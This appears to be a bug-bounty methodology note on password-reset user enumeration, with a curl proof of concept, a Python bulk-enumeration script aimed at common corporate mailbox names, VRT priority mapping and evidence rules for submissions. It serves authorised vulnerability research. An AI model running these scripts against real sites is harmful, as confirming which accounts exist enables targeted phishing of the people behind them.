# Password Reset Enumeration Patterns

## 3-State Response Analysis

Most applications return **different error messages** depending on the state of the email address during password reset. This enables confirmed user enumeration.

### Pattern: 3 Distinct States

| State | Request | Response | Meaning |
|-------|---------|----------|---------|
| Wrong domain | `user@gmail.com` | "Domain does not match" | Workspace restriction active |
| No account | `random@target.com` | "No active account found" | Domain valid, user doesn't exist |
| Account exists | `validuser@target.com` | "Password reset not active" OR "Check your email" | **USER ENUMERATED** |

### PoC Template (curl)
```bash
# Step 1: Get CSRF token
CSRF=$(curl -s -c cookies.txt "https://target.com/accounts/password_reset/" \
  -H "Referer: https://target.com/accounts/password_reset/" \
  | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)

# Step 2: Test three states
curl -s -X POST "https://target.com/accounts/password_reset/" \
  -b cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://target.com/accounts/password_reset/" \
  -d "email=attacker@gmail.com&csrfmiddlewaretoken=$CSRF" \
  | grep -oP '<p class="form-error">\K[^<]+'
# → "Your email domain does not match this workspace"

# Step 3: Test valid domain, non-existent user
# (change email to random@target.com)
# → "No active account found"

# Step 4: Test valid user (common name pattern)
# (change email to admin@target.com)
# → "Password reset is not active for your team" ← USER CONFIRMED
```

### Bulk Enumeration Script
```python
import requests, re

session = requests.Session()
RESET_URL = "https://target.com/accounts/password_reset/"

def get_csrf():
    r = session.get(RESET_URL, headers={"Referer": RESET_URL})
    m = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', r.text)
    return m.group(1) if m else None

def enum_email(email):
    csrf = get_csrf()
    r = session.post(RESET_URL, data={
        "email": email,
        "csrfmiddlewaretoken": csrf
    }, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": RESET_URL
    })
    if "does not match" in r.text:
        return "WRONG_DOMAIN"
    elif "No active account" in r.text:
        return "NO_ACCOUNT"
    elif "Password reset is not active" in r.text:
        return "ACCOUNT_EXISTS_RESET_DISABLED"
    elif "check your email" in r.text.lower():
        return "ACCOUNT_EXISTS_RESET_SENT"
    else:
        return "UNKNOWN"

# Enumerate common corporate patterns
patterns = [
    "admin", "info", "support", "sales", "hr", "security",
    "ceo", "cto", "devops", "engineering", "billing", "legal"
]
for p in patterns:
    result = enum_email(f"{p}@target.com")
    print(f"{p}@target.com → {result}")
```

## VRT Mapping

| Finding | VRT Category | Priority |
|---------|-------------|----------|
| Password reset user enumeration (different responses) | Server Security Misconfiguration > User Enumeration | P4 |
| Password reset user enumeration (timing-based) | Server Security Misconfiguration > User Enumeration | P5 |
| Password reset token not invalidated after use | Broken Access Control > Session Fixation | P3 |

## Scope Considerations

- **Internal tools**: If the endpoint is on a Chime-owned domain (e.g., `research.chime.com`), it's in scope even if it's an "internal" tool — the vulnerability is that it's publicly accessible AND leaks user data
- **Employee emails**: Enumeration of corporate employee emails is reportable — it enables targeted phishing against verified employees
- **Different from social engineering**: The enumeration itself is the vulnerability. Social engineering is the attack that USES it. Don't confuse the two.

## Evidence Requirements (Tier 1 — Gold)

For submission, you MUST show:
1. Three distinct HTTP responses for three different email inputs
2. The actual curl commands and responses (not fabricated)
3. The CSRF token extraction step
4. Confirmation that responses differ in timing/content

**NOT acceptable**: Theoretical "if we try X, it would show Y" without live evidence.
